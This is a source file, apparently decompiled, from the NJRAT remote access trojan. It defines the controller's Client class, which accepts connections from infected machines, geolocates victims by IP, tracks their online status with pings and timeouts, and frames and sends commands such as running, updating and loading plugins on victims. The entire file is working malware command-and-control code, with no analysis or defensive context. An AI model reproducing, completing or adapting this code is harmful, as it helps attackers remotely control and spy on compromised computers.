Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading


Namespace NJRAT
    Public Class Client
        ' Methods
        Public Sub New(ByVal c As TcpClient, ByVal sk As SK)
            Me.t = New Timer(New TimerCallback(AddressOf Me.lam__6), Nothing, 0, &HBB8)
            Me.M = New MemoryStream
            Me.b = New Byte(1 - 1) {}
            Me.string_1 = String.Empty
            Me.Length = -1
            Me.osk = Nothing
            Me.bool_1 = False
            Me.Client = c
            Me.SK = sk
            Try
               Dim class2 As GClass4 = Class7.gclass3_0.method_4(c.Client.RemoteEndPoint.ToString.Split(New Char() { ":"c })(0))
                Me.Co = class2.method_0
                Me.CName = class2.method_1
                If ((Me.Co = "A1") Or (Me.Co = "A2")) Then
                    Me.Co = "--"
                End If
                If Not Class7.form1_0.IMG2.Images.ContainsKey((Me.Co & ".png")) Then
                    Me.Co = "--"
                End If
                Me.COI = DirectCast(Class7.form1_0.IMG2.Images.Item((Me.Co & ".png")), Bitmap)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Me.Client.Client.BeginReceive(Me.b, 0, Me.b.Length, SocketFlags.None, New AsyncCallback(AddressOf Me.b_read), Nothing)
        End Sub

        <DebuggerStepThrough, CompilerGenerated> _
        Private Sub lam__5(ByVal object_0 As Object)
            Me.SEND_(DirectCast(object_0, Byte()))
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub lam__6(ByVal object_0 As Object)
            Me.method_0()
        End Sub

        Public Sub b_read(ByVal ar As IAsyncResult)
            If (Not Me.CN Or Me.bool_1) Then
                GoTo Label_034C
            End If
            Try
                Dim count As Integer = 0
                Try
                    count = Me.Client.Client.EndReceive(ar)
                Catch exception1 As SocketException
                    ProjectData.SetProjectError(exception1)
                    Dim exception As SocketException = exception1
                    Me.string_1 = exception.SocketErrorCode.ToString
                    ProjectData.ClearProjectError()
                    GoTo Label_034C
                End Try
                If (count <= 0) Then
                    GoTo Label_034C
                End If
                Class7.long_1 = (Class7.long_1 + count)
                If (Me.Length = -1) Then
                    If (Me.b(0) = 0) Then
                        Me.Length = Conversions.ToLong(Class6.smethod_12(Me.M.ToArray))
                        Me.M.Dispose()
                        Me.M = New MemoryStream
                        If (Me.Length = 0) Then
                            Me.Length = -1
                            If ((Me.L Is Nothing) And Not Me.isPL) Then
                                Me.string_1 = "LTimeOut"
                                GoTo Label_034C
                            End If
                            Dim num2 As Integer = CInt(Math.Round(CDbl(((DateAndTime.Now.Subtract(Me.lastPing).TotalMilliseconds - 10) / 1.5))))
                            If (num2 < 0) Then
                                num2 = 0
                            End If
                            If (num2 > &H3E7) Then
                                num2 = &H3E7
                            End If
                            Me.lastPing = DateAndTime.Now
                            Me.IsPNGED = False
                            Dim item As New GClass12(Me, Class6.smethod_11(("P" & Class7.string_1 & num2.ToString("000"))))
                            Dim rEQ As List(Of GClass12) = Me.SK.REQ
                            SyncLock rEQ
                                Me.SK.REQ.Add(item)
                            End SyncLock
                            Do While Not item.bool_0
                                Thread.Sleep(1)
                            Loop
                            GoTo Label_02EC
                        End If
                        Me.b = New Byte((CInt((Me.Length - 1)) + 1) - 1) {}
                    Else
                        Me.M.WriteByte(Me.b(0))
                    End If
                Else
                    Me.M.Write(Me.b, 0, count)
                    If (Me.M.Length = Me.Length) Then
                        Me.Length = -1
                        Dim class3 As New GClass12(Me, Me.M.ToArray)
                        Dim list2 As List(Of GClass12) = Me.SK.REQ
                        SyncLock list2
                            Me.SK.REQ.Add(class3)
                        End SyncLock
                        Do While Not class3.bool_0
                            Thread.Sleep(1)
                        Loop
                        Me.M.Dispose()
                        Me.M = New MemoryStream
                        Me.b = New Byte(1 - 1) {}
                    Else
                        Me.b = New Byte((CInt(((Me.Length - Me.M.Length) - 1)) + 1) - 1) {}
                    End If
                End If
                Thread.Sleep(1)
            Catch exception4 As Exception
                ProjectData.SetProjectError(exception4)
                Dim exception2 As Exception = exception4
                Me.string_1 = "RError"
                ProjectData.ClearProjectError()
                GoTo Label_034C
            End Try
Label_02EC:
            If Not Me.CN Then
                Return
            End If
            Try
                Me.Client.Client.BeginReceive(Me.b, 0, Me.b.Length, SocketFlags.None, New AsyncCallback(AddressOf Me.b_read), Nothing)
                Return
            Catch exception5 As SocketException
                ProjectData.SetProjectError(exception5)
                Dim exception3 As SocketException = exception5
                Me.string_1 = exception3.SocketErrorCode.ToString
                ProjectData.ClearProjectError()
            End Try
Label_034C:
            Me.CN = False
        End Sub

        Public Sub Close()
            If Not Me.bool_1 Then
                Me.bool_1 = True
                Me.CN = False
                Try
                    Me.t.Dispose()
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                End Try
                Try
                    Me.M.Dispose()
                Catch exception5 As Exception
                    ProjectData.SetProjectError(exception5)
                    Dim exception2 As Exception = exception5
                    ProjectData.ClearProjectError()
                End Try
                Try
                    If Me.Client.Connected Then
                        Me.Client.GetStream.Close()
                    End If
                Catch exception6 As Exception
                    ProjectData.SetProjectError(exception6)
                    Dim exception3 As Exception = exception6
                    ProjectData.ClearProjectError()
                End Try
                Try
                    Me.Client.Client.Close()
                Catch exception7 As Exception
                    ProjectData.SetProjectError(exception7)
                    Dim exception4 As Exception = exception7
                    ProjectData.ClearProjectError()
                End Try
                Me.Isend = False
                Me.plg.Clear()
                If (Me.string_1 = String.Empty) Then
                    Me.string_1 = "Disconnected"
                End If
                If ((Not Me.L Is Nothing) And Not Me.isPL) Then
                    If Class7.class8_0.bool_1 Then
                        Class7.form1_0.Pp1.WRT(New Object() {Color.LightSteelBlue, Class6.smethod_13, Color.DarkSlateBlue, Me.COI, Me.ip, Color.IndianRed, RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.L)), Color.DarkRed, Me.string_1})
                    End If
                ElseIf Class7.class8_0.bool_2 Then
                    Class7.form1_0.Pp1.WRT(New Object() {Color.LightSteelBlue, Class6.smethod_13, Me.COI, Color.Red, Me.ip, Color.IndianRed, Me.string_1})
                End If
                Dim online As Collection = Class7.sk_0.Online
                SyncLock online
                    If Class7.sk_0.Online.Contains(Me.ip) Then
                        Class7.sk_0.Online.Remove(Me.ip)
                    End If
                End SyncLock
                If (Not Me.L Is Nothing) Then
                    Class7.form1_0.L1.method_9(Me.L)
                End If
                Me.L = Nothing
            End If
        End Sub

        Public Function ip() As String
            If (Me.string_0.Length <= 0) Then
                Try
                    Me.string_0 = Me.Client.Client.RemoteEndPoint.ToString
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    Me.string_0 = Me.GetHashCode.ToString
                    ProjectData.ClearProjectError()
                End Try
            End If
            Return Me.string_0
        End Function

        Private Sub method_0()
            If Not (Me.bool_0 Or Me.bool_1) Then
                Dim client As Client = Me
                SyncLock client
                    Me.bool_0 = True
                    If Not Me.CN Then
                        Me.Close()
                    Else
                        Dim totalSeconds As Double = DateAndTime.Now.Subtract(Me.lastPing).TotalSeconds
                        If (Not Me.isPL AndAlso ((Me.L Is Nothing) And (totalSeconds > 8))) Then
                            Me.string_1 = "LTimeOut"
                            Me.Close()
                        Else
                            If Not Me.NoPing Then
                                If Not Me.IsPNGED Then
                                    If (totalSeconds >= Me.int_0) Then
                                        Me.int_0 = 15
                                        Me.SEND_(Class6.smethod_11(String.Empty))
                                        Me.IsPNGED = True
                                        Me.lastPing = DateAndTime.Now
                                        If Not Me.CN Then
                                            Me.Close()
                                            GoTo Label_01BE
                                        End If
                                    End If
                                ElseIf ((((Me.SendingProgress = 0) And Not Me.isPL) And (totalSeconds > 6)) And (Not Me.L Is Nothing)) Then
                                    Try
                                        If (Me.L.Cells.Count > Class7.int_10) Then
                                            Me.L.Cells.Item(Class7.int_10).Value = "TimeOut"
                                            Me.L.Cells.Item(Class7.int_10).Style.ForeColor = Color.Red
                                            Me.SEND_(New Byte(&H401 - 1) {})
                                            If Not Me.CN Then
                                                Me.Close()
                                                GoTo Label_01BE
                                            End If
                                        End If
                                    Catch exception1 As Exception
                                        ProjectData.SetProjectError(exception1)
                                        Dim exception As Exception = exception1
                                        Me.Close()
                                        ProjectData.ClearProjectError()
                                        GoTo Label_01BE
                                    End Try
                                End If
                            End If
                            Me.bool_0 = False
Label_01BE:
                        End If
                    End If
                End SyncLock
            End If
        End Sub

        Public Function rp() As Integer
            Dim num As Integer
            If (Me.Length = -1) Then
                Return 0
            End If
            Try
                num = Class6.smethod_1(CInt(Me.M.Length), CInt(Me.Length))
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                num = 0
                ProjectData.ClearProjectError()
            End Try
            Return num
        End Function

        Public Function Send(ByVal S As String) As Boolean
            Dim flag As Boolean
            Me.Send(Class6.smethod_11(S))
            Return flag
        End Function

        Public Sub Send(ByVal b As Byte())
            If Me.CN Then
                ThreadPool.QueueUserWorkItem(New WaitCallback(AddressOf Me.lam__5), b)
            End If
        End Sub

        Public Sub SEND_(ByVal b As Byte())
            Try
                Dim client As Client = Me
                SyncLock client
                    Me.SendingProgress = 0
                    Dim strArray As String() = Nothing
                    If (b.Length > 3) Then
                        strArray = New String() {(Conversions.ToString(Strings.ChrW(b(0))) & Conversions.ToString(Strings.ChrW(b(1))) & Conversions.ToString(Strings.ChrW(b(2))))}
                        If Not (((((strArray(0) = "inv") Or (strArray(0) = ("rn" & Conversions.ToString(Strings.ChrW(b(2)))))) Or (strArray(0) = ("up" & Conversions.ToString(Strings.ChrW(b(2)))))) Or (strArray(0) = "ret")) Or (strArray(0) = "PLG")) Then
                            strArray = Nothing
                        End If
                    End If
                    Dim num2 As Integer = 0
                    Dim stream As New MemoryStream
                    Dim length As Integer = b.Length
                    Dim buffer As Byte() = Class6.smethod_11((length.ToString & ChrW(0)))
                    stream.Write(buffer, 0, buffer.Length)
                    stream.Write(b, 0, b.Length)
                    Dim size As Integer = 1
                    Dim num3 As Long = stream.Length
                    stream.Position = 0
                    Do While (size >= 1)
                        Dim buffer2 As Byte() = New Byte(&H2801 - 1) {}
                        size = stream.Read(buffer2, 0, buffer2.Length)
                        Me.Client.Client.Poll(-1, SelectMode.SelectWrite)
                        Try
                            Me.Client.Client.Send(buffer2, 0, size, SocketFlags.None)
                        Catch exception1 As SocketException
                            ProjectData.SetProjectError(exception1)
                            Dim exception As SocketException = exception1
                            Me.SendingProgress = 0
                            Me.string_1 = exception.SocketErrorCode.ToString
                            Me.CN = False
                            ProjectData.ClearProjectError()
                            Return
                        End Try
                        Class7.long_0 = (Class7.long_0 + size)
                        num2 = (num2 + size)
                        If (Not Me.CN Or Me.bool_1) Then
                            Return
                        End If
                        If (Not strArray Is Nothing) Then
                            Me.SendingProgress = Class6.smethod_1(num2, CInt(num3))
                        End If
                    Loop
                    stream.Dispose()
                    Me.SendingProgress = 0
                End SyncLock
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                Me.SendingProgress = 0
                Me.string_1 = "SError"
                Me.CN = False
                ProjectData.ClearProjectError()
            End Try
        End Sub


        ' Fields
        Public b As Byte()
        Private bool_0 As Boolean = False
        Private bool_1 As Boolean
        Public Client As TcpClient
        Public CN As Boolean = True
        Public CName As String = "Unknown"
        Public Co As String = "--"
        Public COI As Bitmap
        Public Folder As String
        Private int_0 As Integer = 5
        Public Isend As Boolean = False
        Public isPL As Boolean = False
        Public IsPNGED As Boolean = False
        Public L As DataGridViewRow
        Public lastAC As String = String.Empty
        Public lastPC As DateTime = New DateTime
        Public lastPing As DateTime = DateTime.Now
        Public Length As Long
        Public M As MemoryStream
        Public msec As Long = 0
        Public NoPing As Boolean = False
        Public osk As Client
        Public plg As List(Of String) = New List(Of String)
        Public SendingProgress As Integer
        Public SK As SK
        Private string_0 As String = String.Empty
        Private string_1 As String
        Public t As Timer
    End Class
End Namespace

